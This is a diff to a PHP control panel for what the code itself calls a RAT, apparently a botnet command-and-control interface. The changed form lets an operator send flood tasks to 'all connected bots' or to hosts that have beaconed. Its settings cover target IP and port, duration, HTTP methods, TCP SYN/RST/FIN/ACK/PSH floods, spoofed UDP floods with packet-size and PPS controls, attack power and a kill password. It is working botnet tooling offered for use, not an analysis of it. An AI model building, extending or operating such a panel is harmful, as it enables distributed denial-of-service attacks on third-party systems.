@@ -9,7 +9,7 @@ if (!isset($_SESSION["authenticated"])) {
 }
 # Else they are authenticated
 else {
-	# Includes the RAT configuration file
+	# Includes the configuration file
 	include "config/config.php";
 
 	# Establishes a connection to the RAT database
@@ -249,114 +249,79 @@ else {
 
 								<!-- Start of task form -->
 								<div class="container" style="display: none;" id="frm">
-									<br>
-									<form role="form" class="form-inline" method="post" action="createTask.php">
-										<input hidden value="" name="seltask" id="seltask"></input>
-										<div class="row">
-											<div class="col-6">
-												<select class="form-select mb-1" name="hostname">
-													<option value="" disabled selected>Choose option</option>
-													<option value="all connected bots">all connected bots</option>
-													<option value="all bots">all bots</option>
-													<?php
-													# Determines the hosts that have previously beaconed
-													$statement = $dbConnection->prepare("SELECT hostname, status FROM hosts");
-													$statement->execute();
-													$hosts = $statement->fetchAll();
-
-													# Kills database connection
-													$statement->connection = null;
-
-													# Populates each <option> drop-down with our hosts that have beaconed previously
-													foreach ($hosts as $row) {
-														if ($row["status"] == "connected") {
-															echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . "🟢 - " . $row["hostname"] . "" . "</option>";
-														} else {
-															echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . "🔴 - " . $row["hostname"] . "" . "</option>";
-														}
-													}
-													?>
-												</select>
-											</div>
-											<div class="col-6">
-												<div id="stdfrm" display="none">
-													<input type="text" class="form-control mb-1" name="ip" id="ip" placeholder="ip or FQDN (without http(s):// or slash)">
-													<input type="text" class="form-control mb-1" name="port" id="port" placeholder="port">
-													<input type="text" class="form-control mb-1" name="time" id="time" placeholder="time (seconds)">
-												</div>
-												<!-- HTTPFRM -->
-												<div id="httpfrm" display="none">
-													<input type="text" class="form-control mb-1" name="path" placeholder="path">
-													<select class="form-select mb-1" name="method">
-														<option value="" disabled selected>Choose option</option>
-														<option value="GET">GET</option>
-														<option value="POST">POST</option>
-														<option value="POST">HEAD</option>
-														<option value="POST">CONNECT</option>
-													</select>
-												</div>
-												<!-- END HTTPFRM -->
-												<!-- KILLFRM -->
-												<div id="killfrm" display="none">
-													<input type="text" class="form-control mb-1" name="killpassword">
-												</div>
-												<!-- END KILLFRM -->
-												<!-- POWERFRM -->
-												<div id="powerfrm" display="none">
-													Power : <label for="power" id="powerlabel" class="form-label">10</label>
-													<input type="range" name="power" value="10" class="form-range" min="10" max="100" step="1" id="power" oninput="document.getElementById('powerlabel').innerHTML = document.getElementById('power').value">
-												</div>
-												<!-- END POWERFRM -->
-												<!-- TCPFRM -->
-												<div id="tcpfrm" display="none">
-													Methods : <input class="form-check-input" type="checkbox" value="syn" name="checkboxes[]">
-													<label class="form-check-label" for="flexCheckDefault">
-														syn
-													</label>&nbsp;
-													<input class="form-check-input" type="checkbox" value="rst" name="checkboxes[]">
-													<label class="form-check-label" for="flexCheckDefault">
-														rst
-													</label>&nbsp;
-													<input class="form-check-input" type="checkbox" value="fin" name="checkboxes[]">
-													<label class="form-check-label" for="flexCheckDefault">
-														fin
-													</label>&nbsp;
-													<input class="form-check-input" type="checkbox" value="ack" name="checkboxes[]">
-													<label class="form-check-label" for="flexCheckDefault">
-														ack
-													</label>&nbsp;
-													<input class="form-check-input" type="checkbox" value="psh" name="checkboxes[]">
-													<label class="form-check-label" for="flexCheckDefault">
-														psh
-													</label>
-												</div>
-												<!-- END TCPFRM -->
-												<!-- UDPFRM -->
-												<div id="udpfrm" display="none">
-													<input class="form-check-input" type="checkbox" value="spoofit" name="spoofit">
-													<label class="form-check-label" for="flexCheckDefault">
-														Spoofit
-													</label><br>
-													PacketSize : <label for="packetsize" id="packetsizelabel" class="form-label">1</label>
-													<input type="range" name="packetsize" value="1" class="form-range" min="1" max="1023" step="1" id="packetsize" oninput="document.getElementById('packetsizelabel').innerHTML = document.getElementById('packetsize').value">
-												</div>
-												<!-- END UDPFRM -->
-												
-												<!-- udpppsfrm -->
-												<div id="udpppsfrm" display="none">
-													<!--
-													Threads : <label for="threads" id="threadlabel" class="form-label">10</label>
-													<input type="range" name="threads" value="10" class="form-range" min="10" max="300" step="1" id="threads" oninput="document.getElementById('threadlabel').innerHTML = document.getElementById('threads').value">
-													-->
-													PacketSize : <label for="ppspacketsize" id="ppspacketsizelabel" class="form-label">2</label>
-													<input type="range" name="ppspacketsize" value="2" class="form-range" min="2" max="100" step="1" id="ppspacketsize" oninput="document.getElementById('ppspacketsizelabel').innerHTML = document.getElementById('ppspacketsize').value">
-												</div>
-												<!-- END udpppsfrm -->
-												
-										</div>
-										<button type="submit" name="submit" class="btn btn-default">Submit</button>
-									</form>
+							<br>
+							<form role="form" class="form-inline" method="post" action="createTask.php">
+							<input hidden value="" name="seltask" id="seltask">
+							<div class="row">
+								<div class="col-6">
+								<select class="form-select mb-1" name="hostname">
+									<option value="" disabled selected>Choose option</option>
+									<option value="all connected bots">all connected bots</option>
+								</select>
 								</div>
+								<div class="col-6">
+								<div id="stdfrm" style="display: none;">
+									<input type="text" class="form-control mb-1" name="ip" id="ip" placeholder="ip or FQDN (without http(s):// or slash)">
+									<input type="text" class="form-control mb-1" name="port" id="port" placeholder="port">
+									<input type="text" class="form-control mb-1" name="time" id="time" placeholder="time (seconds)">
+								</div>
+								<div id="httpfrm" style="display: none;">
+									<input type="text" class="form-control mb-1" name="path" placeholder="path">
+									<select class="form-select mb-1" name="method">
+									<option value="" disabled selected>Choose option</option>
+									<option value="GET">GET</option>
+									<option value="POST">POST</option>
+									<option value="HEAD">HEAD</option>
+									<option value="CONNECT">CONNECT</option>
+									</select>
+								</div>
+								<div id="killfrm" style="display: none;">
+									<input type="text" class="form-control mb-1" name="killpassword">
+								</div>
+								<div id="powerfrm" style="display: none;">
+								<label for="power" class="form-label">Power : <span id="powerlabel">10</span></label>
+								<input type="range" name="power" value="10" class="form-range" min="10" max="100" step="1" id="power">
+								</div>
+
+								<script>
+								const powerRange = document.getElementById('power');
+								const powerLabel = document.getElementById('powerlabel');
+
+								powerRange.addEventListener('input', () => {
+									powerLabel.textContent = powerRange.value;
+								});
+								</script>
+								<div id="tcpfrm" style="display: none;">
+									<label class="form-label">Methods :</label>
+									<input class="form-check-input" type="checkbox" value="syn" name="checkboxes[]">
+									<label class="form-check-label" for="flexCheckDefault">syn</label>&nbsp;
+									<input class="form-check-input" type="checkbox" value="rst" name="checkboxes[]">
+									<label class="form-check-label" for="flexCheckDefault">rst</label>&nbsp;
+									<input class="form-check-input" type="checkbox" value="fin" name="checkboxes[]">
+									<label class="form-check-label" for="flexCheckDefault">fin</label>&nbsp;
+									<input class="form-check-input" type="checkbox" value="ack" name="checkboxes[]">
+									<label class="form-check-label" for="flexCheckDefault">ack</label>&nbsp;
+									<input class="form-check-input" type="checkbox" value="psh" name="checkboxes[]">
+									<label class="form-check-label" for="flexCheckDefault">psh</label>
+								</div>
+								<div id="udpfrm" style="display: none;">
+									<input class="form-check-input" type="checkbox" value="spoofit" name="spoofit">
+									<label class="form-check-label" for="flexCheckDefault">Spoofit</label><br>
+									<label for="packetsize" class="form-label">PacketSize : <span id="packetsizelabel">1</span></label>
+									<input type="range" name="packetsize" value="1" class="form-range" min="1" max="1023" step="1" id="packetsize">
+								</div>
+								<div id="udpppsfrm" style="display: none;">
+									<label for="ppspacketsize" class="form-label">PacketSize : <span id="ppspacketsizelabel">2</span></label>
+									<input type="range" name="ppspacketsize" value="2" class="form-range" min="2" max="100" step="1" id="ppspacketsize">
+								</div>
+								</div>
+								<button type="submit" name="submit" class="btn btn-default" id="submit-btn">Submit</button>
+							</div>
+							</form>
+							<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+							<script>
+							</script>
+							</div>
 								<!-- End of task form -->
 							</div>
 						</div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
